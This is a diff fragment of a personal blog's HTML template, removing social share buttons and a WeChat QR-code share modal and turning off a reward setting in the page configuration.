-    
     <div class="mask" id="mask"></div>
 <a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
-
-
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/&title=《mysql知识点》 — MrzBlog&pic=http://RookieZ996.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/&title=《mysql知识点》 — MrzBlog&source=No way" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《mysql知识点》 — MrzBlog&url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/&via=http://RookieZ996.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p class="wechatshare">扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACxElEQVR42u3awW7CMBAEUP7/p6lU9VCpDcysbWillxMKgfgZKV5mfbvFx/3z+P76+5mfV+ZHcserM9sOPDw8vNHQH9/+6maPz19NSjI1V9OajxkPDw/vNG+2GLRDyc/k3//EgoeHh/dWXjv0fLhtSY2Hh4f3X3hJHJCHDnlUkZT4eHh4eK/n5Tdoy9xZ1tqe35C14OHh4U26TkUD7L2vj/f38PDw8EZd9bwZ1pbjs2K6Hi0eHh7eAV67vWllQG2jq73mctLx8PDwDvCSLU0rGwvy5lnOyyMSPDw8vL28WZs/ma28WZW/m2w1ePKPAQ8PD28Trw1Pk3dnTazkoV8sKnh4eHiHebOH9aw11S4twwAFDw8P7wAv/5OfRwPtgNapeHh4eK/nrUSo7X6nfPp2Ncbw8PDwTvDyB3q+HSq/Jg8s2k0MeHh4eCd49+DINwG0O53azV55vIuHh4d3jpe3rGbBRDLc/FPbAgg8PDy8Bd7s9m3ckC8ts0ii/q+Ah4eHt8DLg4D8BivRRltARxsR8PDw8F7Ia5+xOaa9sg12o0Hj4eHhjXjJl84K5WSI+ZLQFuVf5/Hw8PAO82bxa948mz3021IeDw8P75W89aZXG23MAo6koMfDw8M7x1sf3CyK3buE5JEHHh4e3jpvfaDtNUkIW/8myUZVPDw8vK28W3y0YUS+GKxM1uVPgoeHh3eAl8cKSfGd4NtSPh/V5Wfx8PDwtvLaOGD2KG9L9mRy69AWDw8P7wBvVgS3D/E8aFhpieHh4eGd481iiITUbqt6jGzHgIeHh3ea1xbBbWzRTlMef0QLFR4eHt4xXjKUWTmbTFYyxe2THw8PD+8v8PJtBOuP9aS1tnlhwMPDwzvMayODvFifld2bFwY8PDy8gNc2vWYF92ybwmzjAh4eHt453qwBttLWikKE8ns29/fw8PDwfn/3A9o0X/RF1iB3AAAAAElFTkSuQmCC" alt="微信分享二维码">
-</div>
-
-
 
 
     <!-- waves按钮特效 -->
@@ -614,7 +796,7 @@
 
 <!-- 主题配置脚本 -->
 <script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
 </script>
 
 <!-- jquery -->
